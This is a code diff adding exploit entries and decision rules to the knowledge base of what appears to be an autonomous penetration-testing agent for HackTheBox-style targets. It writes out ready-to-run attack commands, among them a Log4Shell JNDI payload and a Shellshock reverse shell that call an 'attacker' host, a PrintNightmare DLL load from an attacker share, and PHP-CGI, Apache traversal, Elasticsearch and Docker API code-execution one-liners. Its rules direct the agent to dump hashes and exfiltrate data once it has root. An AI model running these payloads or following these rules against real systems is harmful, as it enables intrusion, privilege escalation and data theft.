@@ -2027,6 +2027,100 @@ HTB_CVES: List[CVEEntry] = [
     CVEEntry("MS11-046", "Windows Kernel", "afd.sys privilege escalation in Windows 7 Build 7600",
              "40564.exe (compiled exploit)",
              "SYSTEM", "AFD driver buffer overflow for kernel-level privesc on Win7/2008 (Devel)"),
+    
+    # =========================================================================
+    # Phase 7.1: Additional well-known CVEs (seeded from pentesting knowledge)
+    # =========================================================================
+    CVEEntry("CVE-2021-44228", "Apache Log4j (Log4Shell)",
+             "Remote code execution via JNDI injection in Log4j 2.0-2.14.1",
+             "curl -H 'X-Api-Version: ${jndi:ldap://attacker/exploit}' http://target",
+             "application shell",
+             "Log4Shell: JNDI lookup in user-controlled input → arbitrary code execution. "
+             "Affects ANY Java app using log4j 2.x. Check with: nmap --script log4shell"),
+    CVEEntry("CVE-2017-0144", "Windows SMB (EternalBlue)",
+             "SMBv1 remote code execution in Windows 7/Server 2008",
+             "exploit/windows/smb/ms17_010_eternalblue",
+             "SYSTEM",
+             "NSA-developed exploit leaked by ShadowBrokers. Targets SMBv1 buffer overflow. "
+             "Extremely reliable on unpatched Win7/2008. Check with: nmap --script smb-vuln-ms17-010"),
+    CVEEntry("CVE-2016-5195", "Linux Kernel (DirtyCow)",
+             "Copy-on-write race condition allowing privilege escalation on Linux kernel <4.8.3",
+             "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty",
+             "root",
+             "Race condition in kernel memory management. Affects Linux 2.6.22-4.8.3. "
+             "Multiple PoCs available: dirty.c, dirtycow-mem.c, cowroot.c"),
+    CVEEntry("CVE-2014-6271", "GNU Bash (Shellshock)",
+             "Code injection via specially crafted environment variables in Bash <4.3",
+             "curl -A '() { :; }; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1' http://target/cgi-bin/status",
+             "www-data shell",
+             "CGI scripts using Bash process env vars with function definitions. "
+             "Test: curl -H 'User-Agent: () { :; }; echo vulnerable' http://target/cgi-bin/"),
+    CVEEntry("CVE-2021-34527", "Windows Print Spooler (PrintNightmare)",
+             "Remote code execution via Print Spooler service in all Windows versions",
+             "python3 CVE-2021-34527.py domain/user:pass@target '\\\\attacker\\share\\evil.dll'",
+             "SYSTEM",
+             "Print Spooler loads arbitrary DLL from UNC path. Remote RCE or local privesc. "
+             "Affects Windows 7-11, Server 2008-2022. Check: rpcdump.py | grep MS-RPRN"),
+    CVEEntry("CVE-2022-22965", "Spring Framework (Spring4Shell)",
+             "Remote code execution via data binding in Spring Framework 5.3.0-5.3.17",
+             "python3 spring4shell.py --url http://target/path",
+             "application shell",
+             "ClassLoader manipulation via parameter binding. Affects Tomcat + Spring + JDK 9+. "
+             "Similar to Log4Shell in impact but harder to exploit blindly."),
+    CVEEntry("CVE-2021-41773", "Apache HTTP Server (Path Traversal)",
+             "Path traversal + RCE in Apache 2.4.49-2.4.50 via %2e normalization",
+             "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo;id'",
+             "www-data shell",
+             "URL-encoded dot-dot traversal bypasses path normalization. "
+             "If mod_cgi enabled, leads to RCE. Test with: curl path/.%2e/%2e%2e/etc/passwd"),
+    CVEEntry("CVE-2019-0708", "Windows RDP (BlueKeep)",
+             "Remote code execution via RDP in Windows 7/2008 R2 (pre-auth)",
+             "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+             "SYSTEM",
+             "Use-after-free in RDP termdd.sys driver. Pre-auth, wormable. "
+             "Check: nmap --script rdp-vuln-ms12-020 or auxiliary/scanner/rdp/cve_2019_0708_bluekeep"),
+    CVEEntry("CVE-2018-7600", "Drupal (Drupalgeddon2)",
+             "Remote code execution in Drupal 7.x and 8.x via form API",
+             "python3 drupalgeddon2.py http://target",
+             "www-data shell",
+             "Improper input validation in Form API allows arbitrary PHP execution. "
+             "Affects Drupal 7 < 7.58, 8 < 8.3.9, 8.4 < 8.4.6, 8.5 < 8.5.1"),
+    CVEEntry("CVE-2021-3156", "sudo (Baron Samedit)",
+             "Heap-based buffer overflow in sudo < 1.9.5p2 for local privilege escalation",
+             "python3 exploit_nss.py OR ./sudo-hax-me-a-sandwich 0",
+             "root",
+             "sudoedit -s triggers heap overflow. Affects sudo 1.8.2-1.9.5p1 (10+ years). "
+             "Multiple PoCs for different distros. No sudo access required."),
+    CVEEntry("CVE-2020-1472", "Windows Netlogon (ZeroLogon)",
+             "Privilege escalation via Netlogon protocol cryptographic flaw",
+             "python3 zerologon_tester.py DC_NAME DC_IP",
+             "domain admin",
+             "AES-CFB8 initialization vector of all zeros allows spoofing domain controller. "
+             "Affects all Windows Server versions. Resets DC machine account password."),
+    CVEEntry("CVE-2012-1823", "PHP CGI",
+             "Argument injection in PHP-CGI mode allowing code execution",
+             "curl 'http://target/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' --data '<?php system(\"id\"); ?>'",
+             "www-data shell",
+             "PHP-CGI treats query string as command-line arguments. "
+             "Enables arbitrary PHP config override and code execution. Common on legacy servers."),
+    CVEEntry("CVE-2017-5638", "Apache Struts",
+             "Remote code execution via Content-Type header in Struts 2.3.5-2.3.31",
+             "python3 struts2_rce.py http://target/struts2-showcase/",
+             "application shell",
+             "OGNL injection via crafted Content-Type header in multipart parser. "
+             "Extremely common in enterprise Java apps. Test with Content-Type: %{#cmd='id'}"),
+    CVEEntry("CVE-2014-3120", "Elasticsearch",
+             "Remote code execution via dynamic scripting in Elasticsearch < 1.2.0",
+             "POST /_search -d '{\"script_fields\":{\"x\":{\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\")\"}}}'",
+             "application shell",
+             "Dynamic scripting enabled by default allows arbitrary Java code execution. "
+             "Common on older ELK stacks. MS3 has vulnerable version."),
+    CVEEntry("CVE-2015-1427", "Elasticsearch (Groovy RCE)",
+             "Sandbox bypass in Elasticsearch 1.3.0-1.3.7 via Groovy scripting",
+             "POST /_search -d '{\"script_fields\":{\"x\":{\"script\":\"Thread.currentThread().getContextClassLoader().loadClass(...)\"}}}'",
+             "application shell",
+             "Groovy sandbox escape allows arbitrary command execution. "
+             "Affects Elasticsearch 1.3.0-1.3.7, 1.4.0-1.4.2"),
 ]
 
 
@@ -2085,6 +2179,50 @@ HTB_DECISION_RULES = [
      "reasoning": "Single-command root exploit for modern Ubuntu kernels.", "priority": 3},
     {"if": "Windows whoami /priv shows SeImpersonatePrivilege", "then": "PrintSpoofer or JuicyPotato",
      "reasoning": "Token impersonation = guaranteed SYSTEM on Windows.", "priority": 3},
+    
+    # =========================================================================
+    # Phase 7.1: Additional decision rules — smart reasoning for agents
+    # =========================================================================
+    
+    # Forward-progress reasoning rules (prevent backward/stuck behavior)
+    {"if": "credentials already found for a service", "then": "DO NOT brute-force that service again",
+     "reasoning": "If we already have creds, using them is faster than brute-forcing for more. Move forward.", "priority": 1},
+    {"if": "shell already obtained on target", "then": "DO NOT run more exploit modules against same target",
+     "reasoning": "We already have access. Running more exploits wastes time and increases detection risk.", "priority": 1},
+    {"if": "root/SYSTEM shell obtained", "then": "proceed to post-exploitation and exfiltration immediately",
+     "reasoning": "Root access is the goal of exploitation. Don't linger — dump hashes, grab flags, exfil.", "priority": 1},
+    {"if": "currently in EXPLOITATION but no shell yet", "then": "try the EASIEST exploit first",
+     "reasoning": "Priority: backdoors (ingreslock, vsftpd) > default creds > Metasploit modules > manual.", "priority": 2},
+    {"if": "all major ports already scanned", "then": "DO NOT run nmap again unless new subnet discovered",
+     "reasoning": "Repeated port scanning produces identical results and wastes steps.", "priority": 2},
+    
+    # Service-specific reasoning
+    {"if": "Redis (port 6379) detected without auth", "then": "try redis-cli info, CONFIG SET dir/dbfilename for file write",
+     "reasoning": "Unauthenticated Redis allows writing arbitrary files → SSH key injection or webshell.", "priority": 2},
+    {"if": "MongoDB (port 27017) detected", "then": "try mongo --host target → show dbs → dump collections",
+     "reasoning": "MongoDB often runs without authentication. Contains application data and credentials.", "priority": 2},
+    {"if": "Docker API (port 2375/2376) exposed", "then": "create privileged container mounting /host",
+     "reasoning": "Exposed Docker API = instant root. docker -H tcp://target:2375 run -v /:/host -it alpine chroot /host", "priority": 1},
+    {"if": "Memcached (port 11211) detected", "then": "stats slabs → stats cachedump → get keys",
+     "reasoning": "Memcached stores session tokens, credentials, API keys in plaintext. No auth by default.", "priority": 3},
+    {"if": "Jenkins detected without auth", "then": "go to /script for Groovy console RCE",
+     "reasoning": "Jenkins Groovy console = arbitrary code execution. println 'cmd'.execute().text", "priority": 1},
+    {"if": "WordPress detected", "then": "wpscan --enumerate vp,vt,u THEN check wp-admin with admin:admin",
+     "reasoning": "WordPress plugins are the #1 entry point. Always enumerate before brute-forcing.", "priority": 2},
+    {"if": "Tomcat manager detected", "then": "try tomcat:tomcat, admin:admin THEN deploy WAR shell",
+     "reasoning": "Default Tomcat creds are extremely common. WAR deploy = instant code execution.", "priority": 2},
+    {"if": "NFS shares visible", "then": "showmount -e → mount and look for SSH keys or sensitive files",
+     "reasoning": "World-readable NFS shares can contain SSH keys, configs, and credentials.", "priority": 2},
+    {"if": "SNMP (port 161) detected", "then": "snmpwalk -v2c -c public target",
+     "reasoning": "SNMP with default 'public' community string leaks system info, interfaces, and running processes.", "priority": 3},
+    
+    # Phase transition reasoning
+    {"if": "in RECON with 5+ ports and 3+ services identified", "then": "transition to ENUMERATION",
+     "reasoning": "Sufficient attack surface mapped. Deeper enumeration of each service is now productive.", "priority": 2},
+    {"if": "in ENUMERATION with a confirmed vulnerability or default creds", "then": "transition to EXPLOITATION",
+     "reasoning": "Don't over-enumerate. Once we have a confirmed entry point, use it.", "priority": 2},
+    {"if": "in EXPLOITATION with a user shell", "then": "transition to PRIVILEGE_ESCALATION immediately",
+     "reasoning": "User shell → find privesc path. Don't try more exploits on services we can already access.", "priority": 2},
 ]
 
 
@@ -2108,6 +2246,37 @@ HTB_CVE_SERVICE_MAP = {
     "Linux kernel OverlayFS": ["CVE-2023-0386"],
     "Windows 7 Build 7600": ["MS11-046"],
     "Maltrail 0.53": ["unauthenticated OS command injection"],
+    # Phase 7.1: Additional service → CVE mappings
+    "Apache Log4j": ["CVE-2021-44228"],
+    "Log4j": ["CVE-2021-44228"],
+    "SMBv1": ["CVE-2017-0144"],
+    "Windows SMB": ["CVE-2017-0144"],
+    "EternalBlue": ["CVE-2017-0144"],
+    "Linux kernel < 4.8.3": ["CVE-2016-5195"],
+    "DirtyCow": ["CVE-2016-5195"],
+    "Bash < 4.3": ["CVE-2014-6271"],
+    "Shellshock": ["CVE-2014-6271"],
+    "Windows Print Spooler": ["CVE-2021-34527"],
+    "PrintNightmare": ["CVE-2021-34527"],
+    "Spring Framework": ["CVE-2022-22965"],
+    "Apache 2.4.49": ["CVE-2021-41773"],
+    "Apache 2.4.50": ["CVE-2021-41773"],
+    "Windows RDP": ["CVE-2019-0708"],
+    "BlueKeep": ["CVE-2019-0708"],
+    "Drupal": ["CVE-2018-7600"],
+    "sudo < 1.9.5p2": ["CVE-2021-3156"],
+    "Netlogon": ["CVE-2020-1472"],
+    "ZeroLogon": ["CVE-2020-1472"],
+    "PHP-CGI": ["CVE-2012-1823"],
+    "Apache Struts": ["CVE-2017-5638"],
+    "Elasticsearch < 1.2.0": ["CVE-2014-3120"],
+    "Elasticsearch 1.3-1.4": ["CVE-2015-1427"],
+    "Redis (no auth)": ["unauthenticated file write"],
+    "MongoDB (no auth)": ["unauthenticated database access"],
+    "Docker API (exposed)": ["unauthenticated container creation"],
+    "Jenkins (no auth)": ["Groovy console RCE"],
+    "Tomcat (default creds)": ["WAR deploy RCE"],
+    "Memcached": ["unauthenticated cache dump"],
 }
 
 
